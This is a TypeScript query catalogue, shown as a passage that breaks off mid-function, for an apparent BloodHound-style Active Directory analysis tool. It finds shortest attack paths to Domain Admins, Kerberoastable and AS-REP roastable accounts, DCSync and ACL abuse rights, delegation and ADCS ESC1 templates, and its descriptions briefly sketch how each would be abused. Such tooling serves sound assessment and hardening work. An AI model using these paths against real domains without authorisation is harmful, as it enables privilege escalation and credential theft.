import { BHGraph, BHGraphNode, BHGraphEdge, DANGEROUS_EDGES } from '../services/bloodhoundParser';

// â”€â”€ Public types â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

export type QueryCategory = 'paths' | 'kerberos' | 'acl' | 'delegation' | 'highvalue' | 'adcs';

export interface QueryResult {
    subgraph: BHGraph;
    findings: string[];
    count: number;
}

export interface QueryDef {
    id: string;
    name: string;
    description: string;
    category: QueryCategory;
    requiresOwned: boolean;
    icon: string;
    run: (graph: BHGraph, owned: Set<string>) => QueryResult;
}

// â”€â”€ Node classifiers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

const DA_PATTERNS  = ['DOMAIN ADMINS', 'ENTERPRISE ADMINS', 'SCHEMA ADMINS'];
const HV_PATTERNS  = [
    ...DA_PATTERNS,
    'ADMINISTRATORS', 'KEY ADMINS', 'ENTERPRISE KEY ADMINS',
    'DOMAIN CONTROLLERS', 'ENTERPRISE DOMAIN CONTROLLERS',
    'BACKUP OPERATORS', 'ACCOUNT OPERATORS', 'PRINT OPERATORS', 'SERVER OPERATORS',
];

/** True for groups/objects that are inherently high-privilege targets. */
export function isHighValue(node: BHGraphNode): boolean {
    const up = node.name.toUpperCase();
    if (HV_PATTERNS.some(p => up.startsWith(p + '@') || up === p)) return true;
    if (node.type === 'Domain') return true;
    if (node.properties?.highvalue === true) return true;
    return false;
}

function isDomainAdminNode(node: BHGraphNode): boolean {
    const up = node.name.toUpperCase();
    return DA_PATTERNS.some(p => up.startsWith(p + '@') || up === p) || node.type === 'Domain';
}

// â”€â”€ BFS: all shortest paths from source-set to target-set â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
//
//  Traverses edges in their natural direction (source â†’ target).
//  Returns a subgraph containing every node/edge that lies on ANY shortest path.

export function bfsShortestPaths(
    graph: BHGraph,
    sources: Set<string>,
    targets: Set<string>,
    maxDepth = 12,
): BHGraph {
    if (sources.size === 0 || targets.size === 0) return { nodes: [], edges: [] };

    // Build forward adjacency
    const adj = new Map<string, { label: string; to: string }[]>();
    for (const e of graph.edges) {
        if (!adj.has(e.source)) adj.set(e.source, []);
        adj.get(e.source)!.push({ label: e.label, to: e.target });
    }

    // Multi-source BFS
    const dist = new Map<string, number>();
    const prev = new Map<string, { from: string; label: string }[]>();
    const queue: string[] = [];

    for (const s of sources) {
        if (!dist.has(s)) {
            dist.set(s, 0);
            prev.set(s, []);
            queue.push(s);
        }
    }

    let targetDist = Infinity;
    let qi = 0;

    while (qi < queue.length) {
        const cur  = queue[qi++];
        const d    = dist.get(cur)!;
        if (d >= maxDepth || d >= targetDist) continue;

        for (const { label, to } of adj.get(cur) ?? []) {
            if (!dist.has(to)) {
                dist.set(to, d + 1);
                prev.set(to, [{ from: cur, label }]);
                queue.push(to);
                if (targets.has(to)) targetDist = Math.min(targetDist, d + 1);
            } else if (dist.get(to) === d + 1) {
                prev.get(to)!.push({ from: cur, label });
            }
        }
    }

    if (targetDist === Infinity) return { nodes: [], edges: [] };

    // Backtrack from all reached target nodes to reconstruct every shortest path
    const pathNodeIds = new Set<string>();
    const pathEdges: BHGraphEdge[] = [];
    const backtracked = new Set<string>();

    const backtrack = (id: string) => {
        if (backtracked.has(id)) return;
        backtracked.add(id);
        pathNodeIds.add(id);
        for (const { from, label } of prev.get(id) ?? []) {
            pathEdges.push({ source: from, target: id, label });
            backtrack(from);
        }
    };

    for (const t of targets) {
        if (dist.has(t) && dist.get(t)! <= targetDist) backtrack(t);
    }

    const nodeMap = new Map(graph.nodes.map(n => [n.id, n]));
    const nodes   = Array.from(pathNodeIds)
        .map(id => nodeMap.get(id))
        .filter(Boolean) as BHGraphNode[];

    return { nodes, edges: pathEdges };
}

// â”€â”€ Subgraph helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

/** Build a subgraph from a node list, optionally including their mutual edges. */
function nodeSubgraph(nodes: BHGraphNode[], graph: BHGraph, includeEdges = true): BHGraph {
    const ids   = new Set(nodes.map(n => n.id));
    const edges = includeEdges
        ? graph.edges.filter(e => ids.has(e.source) && ids.has(e.target))
        : [];
    return { nodes, edges };
}

/** Build a subgraph from an edge list (stub any missing nodes). */
function edgeSubgraph(edges: BHGraphEdge[], graph: BHGraph): BHGraph {
    const ids = new Set<string>();
    edges.forEach(e => { ids.add(e.source); ids.add(e.target); });
    const nodeMap = new Map(graph.nodes.map(n => [n.id, n]));
    const nodes = Array.from(ids).map(id => (
        nodeMap.get(id) ?? { id, name: id.slice(-14), type: 'Unknown' }
    )) as BHGraphNode[];
    return { nodes, edges };
}

function nameOf(graph: BHGraph, id: string): string {
    return graph.nodes.find(n => n.id === id)?.name ?? id.slice(-14);
}

// â”€â”€ Query catalogue â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

export const QUERIES: QueryDef[] = [

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• ATTACK PATHS â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    {
        id: 'path-owned-to-da',
        name: 'Shortest Path: Owned â†’ DA',
        description: 'All shortest attack paths from marked owned objects to Domain Admins / Enterprise Admins.',
        category: 'paths',
        requiresOwned: true,
        icon: 'ðŸŽ¯',
        run(graph, owned) {
            const targets  = new Set(graph.nodes.filter(isDomainAdminNode).map(n => n.id));
            const subgraph = bfsShortestPaths(graph, owned, targets);
            const depth    = subgraph.nodes.length > 0
                ? Math.max(...Array.from(owned).map(s => {
                    // approximate depth from edge count in one BFS chain
                    let hops = 0, cur = s;
                    const seen = new Set<string>();
                    while (true) {
                        const next = subgraph.edges.find(e => e.source === cur && !seen.has(e.target));
                        if (!next) break;
                        seen.add(cur); cur = next.target; hops++;
                    }
                    return hops;
                }))
                : 0;
            const findings = subgraph.nodes.length > 0
                ? [
                    `Found attack path(s) â€” ${subgraph.edges.length} edges / ${subgraph.nodes.length} nodes.`,
                    depth > 0 ? `Estimated depth: ${depth} hop(s).` : '',
                ].filter(Boolean)
                : ['No path from owned objects to Domain Admins found.'];
            return { subgraph, findings, count: subgraph.nodes.length };
        },
    },

    {
        id: 'path-owned-to-hvt',
        name: 'Shortest Path: Owned â†’ HVT',
        description: 'Shortest paths from owned objects to ALL High Value Targets (DAs, Admins, DCs, Domains).',
        category: 'paths',
        requiresOwned: true,
        icon: 'ðŸ’€',
        run(graph, owned) {
            const targets  = new Set(graph.nodes.filter(isHighValue).map(n => n.id));
            const subgraph = bfsShortestPaths(graph, owned, targets);
            const findings = subgraph.nodes.length > 0
                ? [`Found paths from ${owned.size} owned object(s) to ${targets.size} high value target(s) â€” ${subgraph.edges.length} edges.`]
                : ['No path from owned objects to any High Value Target.'];
            return { subgraph, findings, count: subgraph.nodes.length };
        },
    },

    {
        id: 'path-owned-admin',
        name: 'Computers Owned Users Admin',
        description: 'All AdminTo, CanRDP, CanPSRemote, and ExecuteDCOM edges from owned objects.',
        category: 'paths',
        requiresOwned: true,
        icon: 'ðŸ–¥ï¸',
        run(graph, owned) {
            const LATERAL = new Set(['AdminTo', 'CanRDP', 'CanPSRemote', 'ExecuteDCOM']);
            const edges   = graph.edges.filter(e => owned.has(e.source) && LATERAL.has(e.label));
            const sub     = edgeSubgraph(edges, graph);
            const comps   = [...new Set(edges.map(e => e.target))];
            const findings = edges.length > 0
                ? [
                    `${owned.size} owned object(s) have lateral movement rights on ${comps.length} computer(s).`,
                    ...edges.slice(0, 8).map(e => `  â€¢ ${nameOf(graph, e.source)} â†’[${e.label}]â†’ ${nameOf(graph, e.target)}`),
                    edges.length > 8 ? `  â€¦ and ${edges.length - 8} more` : '',
                ].filter(Boolean)
                : ['No direct lateral movement edges from owned objects.'];
            return { subgraph: sub, findings, count: comps.length };
        },
    },

    {
        id: 'path-sessions',
        name: 'Sessions on Owned Computers',
        description: 'Privileged users with active sessions on computers you own â€” credential theft targets.',
        category: 'paths',
        requiresOwned: true,
        icon: 'ðŸ‘¤',
        run(graph, owned) {
            // Sessions: user â†’ HasSession â†’ computer
            // We want sessions ON owned computers (owned = computer target)
            const edges = graph.edges.filter(e => e.label === 'HasSession' && owned.has(e.target));
            const sub   = edgeSubgraph(edges, graph);
            const users = [...new Set(edges.map(e => e.source))];
            const hvUsers = users.filter(uid => {
                const n = graph.nodes.find(x => x.id === uid);
                return !!(n?.properties?.admincount);
            });
            const findings = edges.length > 0
                ? [
                    `${users.length} user session(s) found on ${owned.size} owned computer(s).`,
                    hvUsers.length > 0 ? `âš ï¸ ${hvUsers.length} have adminCount=1!` : '',
                    ...edges.slice(0, 8).map(e => `  â€¢ ${nameOf(graph, e.source)} â†’ ${nameOf(graph, e.target)}`),
                ].filter(Boolean)
                : ['No sessions found on owned computers.'];
            return { subgraph: sub, findings, count: users.length };
        },
    },

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• KERBEROS â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    {
        id: 'kerb-kerberoastable',
        name: 'Kerberoastable Users',
        description: 'Enabled users with an SPN â€” request a TGS then crack offline.',
        category: 'kerberos',
        requiresOwned: false,
        icon: 'ðŸ”‘',
        run(graph) {
            const nodes = graph.nodes.filter(n =>
                n.type === 'User' &&
                n.properties?.hasspn === true &&
                n.properties?.enabled !== false
            );
            const sub = nodeSubgraph(nodes, graph);
            const adminHits = nodes.filter(n => n.properties?.admincount).length;
            const findings = [
                `${nodes.length} kerberoastable user(s).`,
                adminHits > 0 ? `âš ï¸ ${adminHits} have adminCount=1 â€” high priority!` : '',
                ...nodes.slice(0, 8).map(n => `  â€¢ ${n.name}`),
                nodes.length > 8 ? `  â€¦ and ${nodes.length - 8} more` : '',
            ].filter(Boolean);
            return { subgraph: sub, findings, count: nodes.length };
        },
    },

    {
        id: 'kerb-asrep',
        name: 'AS-REP Roastable Users',
        description: 'Users with pre-auth disabled â€” capture hash with no credentials.',
        category: 'kerberos',
        requiresOwned: false,
        icon: 'ðŸž',
        run(graph) {
            const nodes = graph.nodes.filter(n =>
                n.type === 'User' &&
                n.properties?.dontreqpreauth === true
            );
            const sub = nodeSubgraph(nodes, graph);
            const findings = [
                `${nodes.length} AS-REP roastable user(s).`,
                ...nodes.slice(0, 10).map(n => `  â€¢ ${n.name}`),
                nodes.length > 10 ? `  â€¦ and ${nodes.length - 10} more` : '',
            ].filter(Boolean);
            return { subgraph: sub, findings, count: nodes.length };
        },
    },

    {
        id: 'kerb-kerberoastable-to-da',
        name: 'Kerberoastable â†’ DA',
        description: 'Shortest paths from kerberoastable service accounts to Domain Admins.',
        category: 'kerberos',
        requiresOwned: false,
        icon: 'ðŸ”‘â†’ðŸŽ¯',
        run(graph) {
            const sources = new Set(
                graph.nodes
                    .filter(n => n.type === 'User' && n.properties?.hasspn === true && n.properties?.enabled !== false)
                    .map(n => n.id)
            );
            const targets  = new Set(graph.nodes.filter(isDomainAdminNode).map(n => n.id));
            const subgraph = bfsShortestPaths(graph, sources, targets);
            const findings = subgraph.nodes.length > 0
                ? [`Found path(s) from ${sources.size} kerberoastable user(s) toward Domain Admins â€” ${subgraph.edges.length} edges.`]
                : ['No path from kerberoastable users to Domain Admins.'];
            return { subgraph, findings, count: subgraph.nodes.length };
        },
    },

    {
        id: 'kerb-asrep-to-da',
        name: 'AS-REP â†’ DA',
        description: 'Shortest paths from AS-REP roastable accounts to Domain Admins.',
        category: 'kerberos',
        requiresOwned: false,
        icon: 'ðŸžâ†’ðŸŽ¯',
        run(graph) {
            const sources  = new Set(
                graph.nodes
                    .filter(n => n.type === 'User' && n.properties?.dontreqpreauth === true)
                    .map(n => n.id)
            );
            const targets  = new Set(graph.nodes.filter(isDomainAdminNode).map(n => n.id));
            const subgraph = bfsShortestPaths(graph, sources, targets);
            const findings = subgraph.nodes.length > 0
                ? [`Found path(s) from ${sources.size} AS-REP roastable user(s) toward Domain Admins.`]
                : ['No path from AS-REP roastable users to Domain Admins.'];
            return { subgraph, findings, count: subgraph.nodes.length };
        },
    },

    {
        id: 'kerb-unconstrained',
        name: 'Unconstrained Delegation (non-DC)',
        description: 'Computers with unconstrained delegation â€” any authenticating user\'s TGT is cached here.',
        category: 'kerberos',
        requiresOwned: false,
        icon: 'ðŸª£',
        run(graph) {
            const dcGroupIds = new Set(
                graph.nodes
                    .filter(n => n.type === 'Group' && n.name.toUpperCase().includes('DOMAIN CONTROLLERS'))
                    .map(n => n.id)
            );
            const dcIds = new Set(
                graph.edges
                    .filter(e => e.label === 'MemberOf' && dcGroupIds.has(e.target))
                    .map(e => e.source)
            );
            const nodes = graph.nodes.filter(n =>
                n.type === 'Computer' &&
                n.properties?.unconstraineddelegation === true &&
                !dcIds.has(n.id)
            );
            const sub = nodeSubgraph(nodes, graph, false);
            const findings = [
                `${nodes.length} non-DC computer(s) with unconstrained delegation.`,
                ...nodes.slice(0, 8).map(n => `  â€¢ ${n.name}`),
                nodes.length > 8 ? `  â€¦ and ${nodes.length - 8} more` : '',
            ].filter(Boolean);
            return { subgraph: sub, findings, count: nodes.length };
        },
    },

    {
        id: 'kerb-constrained',
        name: 'Constrained Delegation',
        description: 'Principals with AllowedToDelegate â€” can impersonate users to specific services.',
        category: 'kerberos',
        requiresOwned: false,
        icon: 'ðŸ”’',
        run(graph) {
            const edges    = graph.edges.filter(e => e.label === 'AllowedToDelegate');
            const sub      = edgeSubgraph(edges, graph);
            const accounts = [...new Set(edges.map(e => e.source))];
            const findings = [
                `${accounts.length} principal(s) with constrained delegation on ${edges.length} service(s).`,
                ...edges.slice(0, 8).map(e => `  â€¢ ${nameOf(graph, e.source)} â†’ ${nameOf(graph, e.target)}`),
                edges.length > 8 ? `  â€¦ and ${edges.length - 8} more` : '',
            ].filter(Boolean);
            return { subgraph: sub, findings, count: accounts.length };
        },
    },

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• ACL / OBJECT CONTROL â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    {
        id: 'acl-dcsync',
        name: 'DCSync Rights',
        description: 'Principals with GetChangesAll on a Domain object â€” can dump ALL hashes via DRSUAPI.',
        category: 'acl',
        requiresOwned: false,
        icon: 'ðŸ’¾',
        run(graph) {
            const allEdges    = graph.edges.filter(e => e.label === 'GetChanges' || e.label === 'GetChangesAll');
            const dcsyncSrcs  = new Set(
                graph.edges.filter(e => e.label === 'GetChangesAll').map(e => e.source)
            );
            const sub        = edgeSubgraph(allEdges, graph);
            const principals  = sub.nodes.filter(n => dcsyncSrcs.has(n.id));
            const findings = [
                `âš ï¸ ${dcsyncSrcs.size} principal(s) can perform DCSync!`,
                ...principals.slice(0, 8).map(n => `  â€¢ ${n.name} (${n.type})`),
            ].filter(Boolean);
            return { subgraph: sub, findings, count: dcsyncSrcs.size };
        },
    },

    {
        id: 'acl-genericall',
        name: 'GenericAll / Full Control',
        description: 'Principals with GenericAll on AD objects â€” complete control, many escalation paths.',
        category: 'acl',
        requiresOwned: false,
        icon: 'ðŸ‘‘',
        run(graph) {
            const edges = graph.edges.filter(e => e.label === 'GenericAll');
            const sub   = edgeSubgraph(edges, graph);
            const findings = [
                `${edges.length} GenericAll ACE(s) across ${sub.nodes.length} object(s).`,
                ...edges.slice(0, 8).map(e =>
                    `  â€¢ ${nameOf(graph, e.source)} â†’ ${nameOf(graph, e.target)}`
                ),
                edges.length > 8 ? `  â€¦ and ${edges.length - 8} more` : '',
            ].filter(Boolean);
            return { subgraph: sub, findings, count: edges.length };
        },
    },

    {
        id: 'acl-writable',
        name: 'WriteDACL / WriteOwner / Owns',
        description: 'Principals that can modify ACLs or take ownership â€” re-ACL and escalate.',
        category: 'acl',
        requiresOwned: false,
        icon: 'âœï¸',
        run(graph) {
            const WRITE = new Set(['WriteDACL', 'WriteOwner', 'Owns', 'GenericWrite', 'WriteAccountRestrictions']);
            const edges = graph.edges.filter(e => WRITE.has(e.label));
            const sub   = edgeSubgraph(edges, graph);
            const findings = [
                `${edges.length} write/own ACE(s) across ${sub.nodes.length} object(s).`,
                ...edges.slice(0, 8).map(e =>
                    `  â€¢ ${nameOf(graph, e.source)} â†’[${e.label}]â†’ ${nameOf(graph, e.target)}`
                ),
                edges.length > 8 ? `  â€¦ and ${edges.length - 8} more` : '',
            ].filter(Boolean);
            return { subgraph: sub, findings, count: edges.length };
        },
    },

    {
        id: 'acl-all-dangerous',
        name: 'All Dangerous ACEs',
        description: 'Every attack-path-relevant edge: AdminTo, GenericAll/Write, WriteDACL, DCSync, LAPS, etc.',
        category: 'acl',
        requiresOwned: false,
        icon: 'âš ï¸',
        run(graph) {
            const edges  = graph.edges.filter(e => DANGEROUS_EDGES.has(e.label));
            const sub    = edgeSubgraph(edges, graph);
            const byType: Record<string, number> = {};
            edges.forEach(e => { byType[e.label] = (byType[e.label] ?? 0) + 1; });
            const findings = [
                `${edges.length} dangerous ACE(s) across ${sub.nodes.length} object(s).`,
                ...Object.entries(byType)
                    .sort((a, b) => b[1] - a[1])
                    .map(([k, v]) => `  â€¢ ${k}: ${v}`),
            ];
            return { subgraph: sub, findings, count: edges.length };
        },
    },

    {
        id: 'acl-laps',
        name: 'LAPS Password Readable',
        description: 'Principals that can read local admin passwords stored in LAPS.',
        category: 'acl',
        requiresOwned: false,
        icon: 'ðŸ”',
        run(graph) {
            const edges = graph.edges.filter(e => e.label === 'ReadLAPSPassword');
            const sub   = edgeSubgraph(edges, graph);
            const findings = [
                `${edges.length} ReadLAPSPassword ACE(s).`,
                ...edges.slice(0, 8).map(e =>
                    `  â€¢ ${nameOf(graph, e.source)} can read LAPS on ${nameOf(graph, e.target)}`
                ),
                edges.length > 8 ? `  â€¦ and ${edges.length - 8} more` : '',
            ].filter(Boolean);
            return { subgraph: sub, findings, count: edges.length };
        },
    },

    {
        id: 'acl-gmsa',
        name: 'GMSA Password Readable',
        description: 'Principals authorised to retrieve a Group Managed Service Account password.',
        category: 'acl',
        requiresOwned: false,
        icon: 'ðŸ—ï¸',
        run(graph) {
            const edges = graph.edges.filter(e => e.label === 'ReadGMSAPassword');
            const sub   = edgeSubgraph(edges, graph);
            const findings = [
                `${edges.length} ReadGMSAPassword ACE(s).`,
                ...edges.slice(0, 8).map(e =>
                    `  â€¢ ${nameOf(graph, e.source)} â†’ ${nameOf(graph, e.target)}`
                ),
                edges.length > 8 ? `  â€¦ and ${edges.length - 8} more` : '',
            ].filter(Boolean);
            return { subgraph: sub, findings, count: edges.length };
        },
    },

    {
        id: 'acl-owned-outbound',
        name: 'Outbound Control from Owned',
        description: 'All dangerous edges directly outbound from marked owned objects.',
        category: 'acl',
        requiresOwned: true,
        icon: 'ðŸ•¹ï¸',
        run(graph, owned) {
            const edges = graph.edges.filter(e => owned.has(e.source) && DANGEROUS_EDGES.has(e.label));
            const sub   = edgeSubgraph(edges, graph);
            const findings = [
                `Owned objects have ${edges.length} outbound dangerous edge(s).`,
                ...edges.slice(0, 8).map(e =>
                    `  â€¢ ${nameOf(graph, e.source)} â†’[${e.label}]â†’ ${nameOf(graph, e.target)}`
                ),
            ].filter(Boolean);
            return { subgraph: sub, findings, count: edges.length };
        },
    },

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• DELEGATION â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    {
        id: 'deleg-rbcd',
        name: 'RBCD Targets (AllowedToAct)',
        description: 'Computers with msDS-AllowedToActOnBehalfOfOtherIdentity â€” RBCD abuse targets.',
        category: 'delegation',
        requiresOwned: false,
        icon: 'ðŸŽ­',
        run(graph) {
            const edges   = graph.edges.filter(e => e.label === 'AllowedToAct');
            const sub     = edgeSubgraph(edges, graph);
            const targets = [...new Set(edges.map(e => e.target))];
            const findings = [
                `${targets.length} RBCD target computer(s), ${edges.length} AllowedToAct edge(s).`,
                ...edges.slice(0, 8).map(e =>
                    `  â€¢ ${nameOf(graph, e.source)} can RBCD to ${nameOf(graph, e.target)}`
                ),
                edges.length > 8 ? `  â€¦ and ${edges.length - 8} more` : '',
            ].filter(Boolean);
            return { subgraph: sub, findings, count: targets.length };
        },
    },

    {
        id: 'deleg-sid-history',
        name: 'SID History',
        description: 'Objects with foreign SID history â€” cross-domain privilege escalation vector.',
        category: 'delegation',
        requiresOwned: false,
        icon: 'ðŸ‘»',
        run(graph) {
            const edges = graph.edges.filter(e => e.label === 'HasSIDHistory');
            const sub   = edgeSubgraph(edges, graph);
            const findings = [
                `${edges.length} HasSIDHistory edge(s) â€” potential SID-filtering bypass.`,
                ...edges.slice(0, 8).map(e =>
                    `  â€¢ ${nameOf(graph, e.source)} carries SID of ${nameOf(graph, e.target)}`
                ),
                edges.length > 8 ? `  â€¦ and ${edges.length - 8} more` : '',
            ].filter(Boolean);
            return { subgraph: sub, findings, count: edges.length };
        },
    },

    {
        id: 'deleg-shadow-creds',
        name: 'Shadow Credentials (WriteAccountRestrictions)',
        description: 'Principals that can write msDS-KeyCredentialLink â€” shadow credential attack.',
        category: 'delegation',
        requiresOwned: false,
        icon: 'ðŸŒ‘',
        run(graph) {
            const edges = graph.edges.filter(e => e.label === 'WriteAccountRestrictions');
            const sub   = edgeSubgraph(edges, graph);
            const findings = [
                `${edges.length} WriteAccountRestrictions edge(s) â€” shadow credential candidates.`,
                ...edges.slice(0, 8).map(e =>
                    `  â€¢ ${nameOf(graph, e.source)} â†’ ${nameOf(graph, e.target)}`
                ),
                edges.length > 8 ? `  â€¦ and ${edges.length - 8} more` : '',
            ].filter(Boolean);
            return { subgraph: sub, findings, count: edges.length };
        },
    },

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• HIGH VALUE â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    {
        id: 'hv-da-members',
        name: 'Domain Admins Members',
        description: 'Direct members of Domain Admins and Enterprise Admins groups.',
        category: 'highvalue',
        requiresOwned: false,
        icon: 'ðŸ‘‘',
        run(graph) {
            const daGroupIds = new Set(
                graph.nodes.filter(isDomainAdminNode).map(n => n.id)
            );
            const edges   = graph.edges.filter(e => e.label === 'MemberOf' && daGroupIds.has(e.target));
            const sub     = edgeSubgraph(edges, graph);
            const members = sub.nodes.filter(n => !daGroupIds.has(n.id));
            const findings = [
                `${members.length} direct member(s) of privileged admin group(s).`,
                ...members.slice(0, 10).map(n => `  â€¢ ${n.name} (${n.type})`),
                members.length > 10 ? `  â€¦ and ${members.length - 10} more` : '',
            ].filter(Boolean);
            return { subgraph: sub, findings, count: members.length };
        },
    },

    {
        id: 'hv-admin-count',
        name: 'AdminCount = 1 Objects',
        description: 'Objects with adminCount=1 â€” were or are members of a privileged protected group.',
        category: 'highvalue',
        requiresOwned: false,
        icon: 'â­',
        run(graph) {
            const nodes  = graph.nodes.filter(n =>
                n.properties?.admincount === true || n.properties?.admincount === 1
            );
            const sub    = nodeSubgraph(nodes, graph);
            const byType: Record<string, number> = {};
            nodes.forEach(n => { byType[n.type] = (byType[n.type] ?? 0) + 1; });
            const findings = [
                `${nodes.length} object(s) with adminCount=1.`,
                ...Object.entries(byType).map(([t, c]) => `  â€¢ ${t}: ${c}`),
            ];
            return { subgraph: sub, findings, count: nodes.length };
        },
    },

    {
        id: 'hv-local-admins',
        name: 'All Local Admin Rights',
        description: 'Every AdminTo edge in the environment â€” full lateral movement surface.',
        category: 'highvalue',
        requiresOwned: false,
        icon: 'ðŸ”“',
        run(graph) {
            const edges   = graph.edges.filter(e => e.label === 'AdminTo');
            const sub     = edgeSubgraph(edges, graph);
            const admins  = [...new Set(edges.map(e => e.source))];
            const targets = [...new Set(edges.map(e => e.target))];
            const findings = [
                `${admins.length} principal(s) with local admin on ${targets.length} computer(s).`,
                ...edges.slice(0, 8).map(e =>
                    `  â€¢ ${nameOf(graph, e.source)} â†’ ${nameOf(graph, e.target)}`
                ),
                edges.length > 8 ? `  â€¦ and ${edges.length - 8} more` : '',
            ].filter(Boolean);
            return { subgraph: sub, findings, count: edges.length };
        },
    },

    {
        id: 'hv-domain-trusts',
        name: 'Domain Trusts Map',
        description: 'All inter-domain trust edges â€” cross-forest attack surface.',
        category: 'highvalue',
        requiresOwned: false,
        icon: 'ðŸŒ',
        run(graph) {
            const TRUST = new Set(['TrustedBy', 'ParentChild', 'CrossLink', 'External', 'Forest', 'Inbound', 'Outbound']);
            const edges  = graph.edges.filter(e => {
                const s = graph.nodes.find(n => n.id === e.source);
                const t = graph.nodes.find(n => n.id === e.target);
                return TRUST.has(e.label) || s?.type === 'Domain' || t?.type === 'Domain';
            });
            const sub    = edgeSubgraph(edges, graph);
            const findings = [
                `${edges.length} domain trust/relationship edge(s) across ${sub.nodes.length} node(s).`,
                ...edges.slice(0, 8).map(e =>
                    `  â€¢ ${nameOf(graph, e.source)} â€”[${e.label}]â†’ ${nameOf(graph, e.target)}`
                ),
                edges.length > 8 ? `  â€¦ and ${edges.length - 8} more` : '',
            ].filter(Boolean);
            return { subgraph: sub, findings, count: edges.length };
        },
    },

    {
        id: 'hv-password-never-expires',
        name: 'Passwords Never Expire',
        description: 'Enabled users whose password is set to never expire â€” persistent accounts.',
        category: 'highvalue',
        requiresOwned: false,
        icon: 'ðŸ”“',
        run(graph) {
            const nodes = graph.nodes.filter(n =>
                n.type === 'User' &&
                n.properties?.passwordneverexpires === true &&
                n.properties?.enabled !== false
            );
            const sub = nodeSubgraph(nodes, graph);
            const findings = [
                `${nodes.length} enabled user(s) with passwords that never expire.`,
                ...nodes.slice(0, 8).map(n => `  â€¢ ${n.name}`),
                nodes.length > 8 ? `  â€¦ and ${nodes.length - 8} more` : '',
            ].filter(Boolean);
            return { subgraph: sub, findings, count: nodes.length };
        },
    },

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• ADCS â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    // â”€â”€ Helper inner data â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // Authentication EKU OIDs that make a cert template useful for auth attacks
    // (Client Authentication, Smart Card Logon, PKINIT, Any Purpose, sub-CA)

    {
        id: 'adcs-esc1',
        name: 'ESC1 â€” Enrollee Supplies SAN',
        description:
            'Certificate templates where enrollers can supply a Subject Alternative Name (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT). ' +
            'Enroll with targetted UPN (e.g. Administrator) â†’ authenticate via PKINIT â†’ NT hash.',
        category: 'adcs',
        requiresOwned: false,
        icon: 'ðŸ“œ',
        run(graph) {
            // Auth EKU OIDs recognised by Windows for Kerberos / PKINIT
            const AUTH_EKUS = new Set([
                '1.3.6.1.5.5.7.3.2',   // Client Authentication
                '1.3.6.1.4.1.311.20.2.2', // Smart Card Logon
                '1.3.6.1.5.2.3.4',     // PKINIT Client Auth
                '2.5.29.37.0',          // Any Purpose
                '',                     // No EKU (effectively Any Purpose)
            ]);

            const vulnTemplates = graph.nodes.filter(n => {
                if (n.type !== 'CertTemplate') return false;
                const p = n.properties ?? {};
                // Must allow enrollee-supplied SAN (flag 0x1 in certificatenameflag or bool property)
                const supplySubject =
                    p.enrolleeSuppliesSubject === true ||
                    p.enrolleesuppliessubject === true ||
                    (typeof p.certificatenameflag === 'number' && (p.certificatenameflag & 0x1) !== 0);
                if (!supplySubject) return false;
                // Must NOT require manager approval
                const approval = p.requiresmanagerapproval ?? p.requiresManagerApproval;
                if (approval === true) return false;
                // Must NOT require authorised signatures (enrollment agent)
                const authSigs = p.authorizedsignatures ?? p.authorizedsignatures ?? 0;
                if (typeof authSigs === 'number' && authSigs > 0) return false;
                // Must have an authentication-capable EKU
                const ekus: string[] = p.ekus ?? p.certificateapplicationpolicy ?? [];
                const hasAuthEku = ekus.length === 0 ||
                    ekus.some((e: string) => AUTH_EKUS.has(e));
                return hasAuthEku;
            });

            // Find who can Enroll in these templates
            const templateIds = new Set(vulnTemplates.map(n => n.id));
            const enrollEdges = graph.edges.filter(
                e => (e.label === 'Enroll' || e.label === 'GenericAll' || e.label === 'AllExtendedRights') &&
                     templateIds.has(e.target)
            );
            const enrollers = [...new Set(enrollEdges.map(e => e.source))];

            // Published-to edges so we can show which CAs offer these templates
            const publishedEdges = graph.edges.filter(
                e => e.label === 'PublishedTo' && templateIds.has(e.source)
            );

            const sub = edgeSubgraph([...enrollEdges, ...publishedEdges], graph);
            // Add template nodes explicitly in case they have no edges yet
